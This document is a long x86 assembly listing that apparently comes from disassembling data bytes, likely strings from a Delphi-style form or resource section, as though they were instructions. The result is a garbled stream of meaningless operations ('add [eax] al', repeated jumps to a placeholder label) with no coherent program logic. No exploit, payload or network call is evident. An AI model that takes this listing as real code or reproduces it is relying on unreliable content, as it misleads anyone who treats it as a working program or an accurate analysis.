movsb [ edi ] [ esi ]
inc esp
jb r-xdata
jb r-xdata
add ah ah
jae r-xdata
add [ ebp + esi * 2 + 0x44 ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
add [ esi * 2 + 0x74200044 ] bl
inc esp
add [ ebx + esi * 2 + 0x73e40044 ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
push esp
inc esi
inc esp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x46 ] dl
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x44 ] ah
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ esi + 0x44 ] dh
inc ebx
outsd
outsb
je r-xdata
jbe r-xdata
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 4 + 0x47 ] si
add [ eax ] bh
jne r-xdata
add [ eax + ecx * 2 + r--data ] cl
inc esp
jb r-xdata
add [ ebx + 0x44479cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0x75440044 ] bh
inc esp
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
jb r-xdata
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add al bl
jne r-xdata
add [ esi + esi * 2 + 0x44 ] bh
add [ eax ] ah
je r-xdata
inc esp
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
insb
jae r-xdata
je r-xdata
add [ esi + esi * 2 ] al
inc esp
add [ ebp + esi * 2 + 0x54160044 ] dh
inc edx
popad
jae r-xdata
add [ esi * 2 + 0x75440044 ] bh
inc esp
add [ eax ] al
push eax
inc edi
inc esp
add [ esp + esi + 0x75a40040 ] bl
inc esp
add [ ebp + esi * 2 + 0x34b00044 ] dl
inc eax
add [ eax ] al
mov [ eax + 0x44 ] cs
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
inc esp
xor al [ eax ]
fdiv [ ebx + 0x44 ]
outsd
insd
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add ah ah
jae r-xdata
add [ esp + esi + 0x75a40040 ] bl
inc esp
add al cl
jbe r-xdata
add [ ebp + esi * 2 + 0x54120044 ] dh
inc esp
add [ ebp + 0x48600040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ eax ]
xor [ esi + 0x44 ] dh
add [ eax ] ah
jne r-xdata
inc esp
add [ eax ] ch
inc edi
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc edi
jne r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
inc edi
inc esp
add [ edi ] al
push ss
push esp
cmp [ ebp + 0x44 ] dh
je r-xdata
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
add [ eax ] ah
je r-xdata
jne r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
jl r-xdata
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 8 + 0x49 ] si
inc esp
add [ eax + 0x1c004478 ] ch
jne r-xdata
add [ eax ] al
add [ eax ] al
add al bl
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec ecx
inc esp
add [ eax + 0x3c004476 ] cl
jne r-xdata
add [ esi + esi * 2 + 0x44 ] bh
add [ eax ] ah
je r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] dh
jbe r-xdata
add [ eax - 0x5bffbfcc ] dh
inc esp
add [ eax ] bh
jne r-xdata
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ ebp + esi * 2 + 0x44 ] al
outsd
insb
jae r-xdata
inc esp
jb r-xdata
add [ eax + 0x77 ] ah
inc esp
add ah ah
jae r-xdata
arpl [ esp + edi * 2 + 0x49 ] si
inc esp
add al ah
inc edi
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ esi * 2 + 0x75440044 ] bh
inc esp
add [ edi + esi * 2 + 0x76cc0044 ] bh
inc esp
add [ eax + edi * 2 ] al
inc esp
add [ eax - 0x6bffbb88 ] al
js r-xdata
add [ eax ] dh
jbe r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add ah ah
jae r-xdata
add [ eax ] al
add [ eax ] al
adc al 0x48
inc esp
add [ eax + 0x4004476 ] ch
jbe r-xdata
jne r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x14 ] si
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
mov [ edx - 0x5353ffbc ] cs
inc ecx
add [ esp + ebp * 4 - 0x5437ffbf ] dh
add [ eax + edi * 2 + 0x54110044 ] dh
inc esp
jb r-xdata
add [ ebx + 0x444a40c0 ] cl
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] dh
ja r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
dec edi
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x44 ] bh
add [ eax ] dh
add [ eax ] al
xor [ ecx + 0x44 ] cl
add [ eax + edi * 2 + 0x540f0044 ] dh
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004476 ] cl
add [ eax + 0x70004449 ] bh
add [ eax ] al
add [ eax + 0x4004476 ] ch
jbe r-xdata
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] ah
or [ edx ] al
cld
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add ah dh
inc esi
inc edx
add al ah
inc esi
inc edx
add [ eax + 0xe00448a ] bh
inc ecx
add al cl
stosd [ edi ]
inc esp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
fmul [ edx + 0x44 ]
add [ eax + 0x1c004478 ] ch
jne r-xdata
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] dh
jbe r-xdata
add [ esp + esi + 0x75a40040 ] bl
inc esp
add [ eax + edi * 2 + 0x34b00044 ] bh
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
xor [ edi + 0x44 ] dh
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax + 0x47 ] dl
inc esp
add [ esp + esi + 0x75a40040 ] bl
inc esp
add [ ebp + esi * 2 + 0x34b00044 ] dl
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
xor [ edi + 0x44 ] dh
add [ ebp + esi * 2 + 0x54140044 ] dh
inc esp
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x444c1090
add [ ebx ] al
or al 0x54
mov [ eax + eax + 0x54 ] es
or [ edx ] al
sbb al 0x8f
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr ah 0x4a
inc esp
add [ eax ] ah
je r-xdata
add ah dl
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
dec edx
inc esp
add [ eax + eax ] ah
add [ eax ] al
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x44 ] cl
or [ ebx + 0x44 ] cl
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x77 ] ah
inc esp
add ah ah
jae r-xdata
inc eax
add [ ebp + ecx * 2 + 0x44 ] bh
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc esp
add [ eax - 0x37ffbdf8 ] cl
pop [ eax + eax - 0x28 ]
pop es
inc edx
add [ eax + ecx + 0x42 ] ch
add al al
or [ edx ] al
or [ esi + 0x66040044 ] cl
inc ebp
inc edx
add [ edi + ecx * 4 ] bl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jne r-xdata
mov [ eax + eax - 0x4c ] es
lodsb [ esi ]
inc ecx
add al cl
stosd [ edi ]
add [ eax ] esi
dec ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb00444c ] cl
jae r-xdata
or al 0x4d
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + ecx * 2 ] cl
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
and [ eax ] cl
inc edx
add ah bh
jae r-xdata
add [ eax ] cl
dec ebx
inc esp
add [ edi + esi * 2 + 0x76cc0044 ] bh
inc esp
add [ eax + edi * 2 ] al
inc esp
add [ eax - 0x6bffbb88 ] al
js r-xdata
add [ esi * 2 + 0x75440044 ] bh
inc esp
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
dec esp
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
ror [ esp + ecx * 2 + 0xa030044 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
push esp
inc ebx
outsd
outsb
je r-xdata
dec edx
inc esp
add [ esi + ebx + 0x42 ] ch
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
pop esp
mov [ eax + eax + 0x1 ] es
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
pop esp
mov [ eax + eax + 0x1 ] es
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add al ch
mov [ eax + eax - 0x28 ] es
add [ esp + ebp * 4 - 0x5437ffbf ] dh
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add [ esp + esi + 0x34b00040 ] ch
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add [ esi + ecx * 4 + 0x44 ] bh
add [ esi ] ch
inc ebp
add [ eax + 0x66 ] al
inc ebp
add ah dh
pop [ eax + eax - 0x50 ]
mov es [ eax + eax + 0x7c ]
inc bp
add [ eax - 0x17ffba9a ] dl
mov es [ eax + eax - 0x48 ]
inc bp
add [ edi + ecx * 4 + 0x44 ] al
add al al
inc bp
add [ edi + ecx * 4 + 0x44 ] ah
add al cl
inc bp
add [ eax - 0x70 ] bh
inc esp
add [ eax - 0x70 ] bl
inc esp
add [ eax - 0x7bffbb70 ] bl
pop [ eax + eax - 0x24 ]
inc bp
add al ah
inc bp
add [ eax + 0x1800448f ] ch
lea eax [ eax + eax + 0x12 ]
push esp
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ eax ] cl
mov es [ eax + eax + 0x4 ]
inc bp
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
outsb
je r-xdata
dec ebp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
mov [ ebp + 0x44 ] cs
add [ eax + eax ] dl
add bh bh
pop esp
mov [ eax + eax + 0x1 ] es
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x444d8c74
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ecx * 4 ] dl
inc esp
mov al 0x34
outsd
insb
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
add al [ eax ]
add [ eax ] al
mov [ esp + eax * 2 ] cl
or esp [ ebx + esi * 2 + 0x44 ]
dec esp
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x4b7c0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
dec ebx
inc esp
add [ eax + eax ] bl
add [ eax ] al
sbb al 0x5f
inc ebp
add [ esp + esi + 0x34a80040 ] bl
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
inc esp
outsd
insb
jae r-xdata
outsb
je r-xdata
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
add [ eax ] dl
add [ eax ] al
[ esp + ecx * 4 + 0x44 ]
add [ ecx ] al
dec ebp
inc esp
imul ebp [ esi + 0x74 ] 0x444df873
add ah ch
add [ ecx ] 0x4
add [ eax ] cl
inc ebx
outsd
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
add [ ecx ] al
imul ebp [ esi + 0x74 ] r-xdata
and al 0x4e
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x4d34c08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
fmul [ esp + eax * 2 ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax ] cl
add [ eax ] al
[ esp + ecx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ ebp + ecx * 2 + 0x80044 ] cl
add bh bh
pop esp
mov [ eax + eax + 0x1 ] es
je r-xdata
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
mov eax [ eax + eax + 0x10 ]
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc esp
add al bl
add eax 0x0
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc esp
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
xor al 0x4d
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax ] dh
dec ebp
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx + 0x10800040 ] dl
inc eax
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
imul esp [ edi + 0x68 ] 0x444d8c74
imul esp [ gs : edi + 0x68 ] 0x444d8c74
add [ eax + eax ] cl
add bh bh
add [ eax + 0x7c ] ah
inc ecx
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx + 0x11940040 ] dl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x444c ] cl
adc [ eax ] al
nop
int3
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x44 ] cl
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al bl
dec esp
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
xchg esp eax
adc [ eax ] eax
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ebx + 0x444f58c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
xchg esp eax
adc [ eax ] eax
or al 0x4c
inc esp
add [ eax + 0x7c ] ah
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
je r-xdata
inc esp
jb r-xdata
inc esp
jb r-xdata
jbe r-xdata
xchg esp eax
adc [ eax ] eax
pushad
jl r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov [ esp + eax * 2 ] cl
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x4fbc0040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
xchg esp eax
add [ ecx + edx * 2 + 0x44 ] dh
add [ eax ] cl
or eax 0x646e4554
inc esp
add [ eax ] ch
inc edi
inc esp
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
sub al 0x51
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx + 0x10280040 ] dl
inc eax
add [ ebp + 0x50440040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x94007261
adc [ eax ] eax
sub [ eax ] dl
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
rcl [ ecx + 0x44 ] 0x1
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
sub [ edi + 0x44 ] al
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x6c ] si
push ebx
outsb
add al 0x8
push es
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
xchg esp eax
adc [ eax ] eax
xchg esp eax
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
xchg esp eax
adc [ eax ] eax
enter 0x4449 0x0
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
cmp [ edx + 0x44 ] dl
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
xchg esp eax
adc [ eax ] eax
xchg esp eax
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx + 0x49c80040 ] dl
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x444c ] cl
adc [ eax ] al
nop
enter 0x4452 0x0
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
xchg esp eax
adc [ eax ] eax
enter 0x4449 0x0
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov [ esp + eax * 2 ] cl
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
or al 0x54
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
and [ ecx + 0x44 ] bl
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
